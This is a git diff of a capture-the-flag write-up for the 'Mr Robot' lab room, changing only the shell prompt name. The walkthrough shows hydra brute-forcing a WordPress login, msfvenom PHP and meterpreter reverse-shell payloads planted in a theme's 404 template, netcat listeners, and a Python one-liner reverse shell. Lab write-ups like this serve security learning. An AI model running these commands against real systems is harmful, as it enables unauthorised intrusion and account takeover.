@@ -1,7 +1,7 @@
 # enumeration
 ## nmap
 ```console
-kali@kali:~$ sudo python3 pymap.py -t 10.10.82.107 
+bibo318@parrot:~$ sudo python3 pymap.py -t 10.10.82.107 
 created by gu2rks/kurohat                                                                          
 find me here https://github.com/gu2rks                                                             
                                                                                                    
@@ -59,7 +59,7 @@ key-1-of-3.txt
 #### fsocity.dic
 I try to check the content of the file, it looks like a word list
 ```console
-kali@kali:~/THM/mrRobot$ wc -l fsocity.dic 
+bibo318@parrot:~/THM/mrRobot$ wc -l fsocity.dic 
 858160 fsocity.dic
 ```
 
@@ -116,19 +116,19 @@ that is when I found out that the the web page is hosted on wordpress. Moreover 
 so the goal is using `hydra` to brute-force the using `fsocity.dic` as wordlist. my gut said that the username is **elliot** eller **mr.robot** since they are the boss is the boss of fsocity
 
 ```console
-kali@kali:~/THM/mrRobot$ nano users.txt # mr.robot elliot
-kali@kali:~/THM/mrRobot$ hydra 10.10.250.6 -L users.txt -P fsocity.dic http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -V -t 64 -I
+bibo318@parrot:~/THM/mrRobot$ nano users.txt # mr.robot elliot
+bibo318@parrot:~/THM/mrRobot$ hydra 10.10.250.6 -L users.txt -P fsocity.dic http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -V -t 64 -I
 ```
 
 it take really long time so I decide to sort and remove duplicate world in `fsocity.dic` [how to do?](https://www.cyberciti.biz/faq/unix-linux-shell-removing-duplicate-lines/)
 ```console
-kali@kali:~/THM/mrRobot$ sort fsocity.dic | uniq -u > passwd.txt 
-kali@kali:~/THM/mrRobot$ wc -l passwd.txt 
+bibo318@parrot:~/THM/mrRobot$ sort fsocity.dic | uniq -u > passwd.txt 
+bibo318@parrot:~/THM/mrRobot$ wc -l passwd.txt 
 10 passwd.txt
 ```
 lmao now we have only 10 password left, let hope that it works otherwise we go back to `fsocity.dic`
 ```console
-kali@kali:~/THM/mrRobot$ hydra 10.10.250.6 -L users.txt -P passwd.txt http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -V -t 64 -I
+bibo318@parrot:~/THM/mrRobot$ hydra 10.10.250.6 -L users.txt -P passwd.txt http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' -V -t 64 -I
 [80][http-post-form] host: 10.10.250.6   login: elliot   password: PASSWORD
 ```
 
@@ -139,7 +139,7 @@ options: user [`wpscan`](https://wpscan.org/)  : ```$ hydra -L lists/usrname.txt
 
 use ```msfvenom``` to crate reverse shell
 ```console
-kali@kali:~/THM/mrRobot$ msfvenom -p php/reverse_php LHOST=<ip>  LPORT=1234 -f raw > shell.php
+bibo318@parrot:~/THM/mrRobot$ msfvenom -p php/reverse_php LHOST=<ip>  LPORT=1234 -f raw > shell.php
 ```
 
 I try to upload the shell but it didnt works
@@ -148,7 +148,7 @@ I try to upload the shell but it didnt works
 After some I found this. ```http://<target>/wp-admin/theme-editor.php?```, it allows us to change php files. so I `cat` my shell.php and put in `template 404` 
 
 ```console
-kali@kali:~/Downloads$ nc -nlvp 1234  # nc and then try to visite a site that not exist on the target website                                              
+bibo318@parrot:~/Downloads$ nc -nlvp 1234  # nc and then try to visite a site that not exist on the target website                                              
 listening on [any] 1234 ...                                                                        
 connect to [10.8.14.151] from (UNKNOWN) [10.10.250.6] 33657                                        
 whoami                                                                                             
@@ -159,7 +159,7 @@ pwd
 
 # user 
 ```
-kali@kali:~/Downloads$ nc -nlvp 1234
+bibo318@parrot:~/Downloads$ nc -nlvp 1234
 listening on [any] 1234 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.250.6] 33664
 ls
@@ -215,8 +215,8 @@ abcdefghijklmnopqrstuvwxyz
 
 seem like the shell which i use is not good, I cant use it to spawn pty shell and so on. let move to ```meterpreter shell```
 ```console
-kali@kali:~/THM/mrRobot$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.8.14.151 LPORT=1234 -f raw > shell.php
-kali@kali:~/THM/mrRobot$ cat shell.php # copy and put it in 404 template
+bibo318@parrot:~/THM/mrRobot$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.8.14.151 LPORT=1234 -f raw > shell.php
+bibo318@parrot:~/THM/mrRobot$ cat shell.php # copy and put it in 404 template
 ```
 
 ```console
@@ -241,7 +241,7 @@ Back to my tcp php shell. my Idea is
 
 Let do it
 ```console
-kali@kali:~$ nc -nvlp 1234
+bibo318@parrot:~$ nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.242.203] 34748
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -249,7 +249,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 another nc listen on 6969 (cth and lucifer weirdness getting in my head)
 ```console
-kali@kali:~$ nc -nvlp 6969
+bibo318@parrot:~$ nc -nvlp 6969
 listening on [any] 6969 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.242.203] 49822
 /bin/sh: 0: can't access tty; job control turned off
